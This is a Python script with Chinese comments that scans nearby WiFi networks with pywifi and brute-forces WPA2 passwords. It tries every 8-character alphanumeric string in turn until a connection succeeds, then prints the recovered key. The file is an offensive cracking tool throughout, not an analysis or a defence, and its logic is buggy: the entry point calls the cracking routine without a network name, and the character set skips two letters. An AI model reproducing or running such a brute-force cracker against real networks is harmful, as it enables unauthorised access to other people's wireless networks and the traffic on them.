# coding:utf-8
import time  #时间
import pywifi  #破解wifi
from pywifi import const  #引用一些定义

class PoJie():
    def __init__(self):
        wifi = pywifi.PyWiFi()                  #抓取网卡接口
        self.iface = wifi.interfaces()[0]       #抓取第一个无限网卡
        self.iface.disconnect()                 #测试链接断开所有链接

        self.profile = pywifi.Profile()  # 创建wifi链接文件
        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元

        self.password_dict = list(('0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                              'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j',
                              'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't',
                              'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D',
                              'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'O', 'P',
                              'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'))
        time.sleep(1) #休眠1秒

        #测试网卡是否属于断开状态，
        #assert self.iface.status() in\
        #    [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

    def scan(self):
        bessis = self.iface.scan_results()

        wifi_list = []
        ssid_set=set()
        for data in bessis:
            if data.ssid in ssid_set:
                continue
            else:
                ssid_set.add(data.ssid)
                wifi_type = 'AKM_TYPE_NONE'
                if data.akm[0] == 4:
                    wifi_type = 'AKM_TYPE_WPA2PSK'
                wifi_list.append((data.ssid, data.signal,wifi_type))

        print(wifi_list)
        return wifi_list

    def genPassword(self):
        for key1 in self.password_dict:
            for key2 in self.password_dict:
                for key3 in self.password_dict:
                    for key4 in self.password_dict:
                        for key5 in self.password_dict:
                            for key6 in self.password_dict:
                                for key7 in self.password_dict:
                                    for key8 in self.password_dict:
                                        yield key1+key2+key3+key4+key5+key6+key7+key8


    def test_connect(self,id):#测试链接
        self.profile = pywifi.Profile()  # 创建wifi链接文件
        self.profile.auth = const.AUTH_ALG_OPEN  # 网卡的开放
        self.profile.akm.append(const.AKM_TYPE_WPA2PSK)  # wifi加密算法
        self.profile.cipher = const.CIPHER_TYPE_CCMP  # 加密单元

        self.profile.ssid =id #wifi名称
        print("开始破解----ssid为",id)
        gen = self.genPassword()
        while True:
            try:
                myStr = next(gen)
                self.profile.key = myStr
                tmp_profile = self.iface.add_network_profile(self.profile)  # 设定新的链接文件
                self.iface.connect(tmp_profile)  # 链接
                # sleep
                #time.sleep(2)
                if self.iface.status() == const.IFACE_CONNECTED:  # 判断是否连接上
                    print("密码正确：", myStr)
                    break
                else:
                    print("密码错误:" + myStr)
            except:
                continue

        self.iface.disconnect() #断开
        #检查断开状态
        assert self.iface.status() in\
            [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]

        return myStr


if __name__ == '__main__':

    start=PoJie()
    start.test_connect()
    # gen = start.genPassword();
    # print(gen.send(None))